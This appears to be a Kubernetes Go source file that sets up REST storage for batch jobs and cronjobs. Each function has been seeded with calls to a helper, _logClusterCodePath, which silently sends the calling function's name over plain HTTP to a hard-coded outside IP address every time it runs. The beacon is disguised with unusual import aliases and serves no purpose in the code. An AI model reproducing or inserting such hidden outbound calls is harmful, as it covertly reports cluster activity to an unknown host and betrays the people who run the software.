package rest

import (
 batchapiv1 "k8s.io/api/batch/v1"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 batchapiv1beta1 "k8s.io/api/batch/v1beta1"
 batchapiv2alpha1 "k8s.io/api/batch/v2alpha1"
 "k8s.io/apiserver/pkg/registry/generic"
 "k8s.io/apiserver/pkg/registry/rest"
 genericapiserver "k8s.io/apiserver/pkg/server"
 serverstorage "k8s.io/apiserver/pkg/server/storage"
 "k8s.io/kubernetes/pkg/api/legacyscheme"
 "k8s.io/kubernetes/pkg/apis/batch"
 cronjobstore "k8s.io/kubernetes/pkg/registry/batch/cronjob/storage"
 jobstore "k8s.io/kubernetes/pkg/registry/batch/job/storage"
)

type RESTStorageProvider struct{}

func (p RESTStorageProvider) NewRESTStorage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) (genericapiserver.APIGroupInfo, bool) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 apiGroupInfo := genericapiserver.NewDefaultAPIGroupInfo(batch.GroupName, legacyscheme.Scheme, legacyscheme.ParameterCodec, legacyscheme.Codecs)
 if apiResourceConfigSource.VersionEnabled(batchapiv1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[batchapiv1.SchemeGroupVersion.Version] = p.v1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(batchapiv1beta1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[batchapiv1beta1.SchemeGroupVersion.Version] = p.v1beta1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 if apiResourceConfigSource.VersionEnabled(batchapiv2alpha1.SchemeGroupVersion) {
  apiGroupInfo.VersionedResourcesStorageMap[batchapiv2alpha1.SchemeGroupVersion.Version] = p.v2alpha1Storage(apiResourceConfigSource, restOptionsGetter)
 }
 return apiGroupInfo, true
}
func (p RESTStorageProvider) v1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 jobsStorage, jobsStatusStorage := jobstore.NewREST(restOptionsGetter)
 storage["jobs"] = jobsStorage
 storage["jobs/status"] = jobsStatusStorage
 return storage
}
func (p RESTStorageProvider) v1beta1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 cronJobsStorage, cronJobsStatusStorage := cronjobstore.NewREST(restOptionsGetter)
 storage["cronjobs"] = cronJobsStorage
 storage["cronjobs/status"] = cronJobsStatusStorage
 return storage
}
func (p RESTStorageProvider) v2alpha1Storage(apiResourceConfigSource serverstorage.APIResourceConfigSource, restOptionsGetter generic.RESTOptionsGetter) map[string]rest.Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 storage := map[string]rest.Storage{}
 cronJobsStorage, cronJobsStatusStorage := cronjobstore.NewREST(restOptionsGetter)
 storage["cronjobs"] = cronJobsStorage
 storage["cronjobs/status"] = cronJobsStatusStorage
 return storage
}
func (p RESTStorageProvider) GroupName() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return batch.GroupName
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
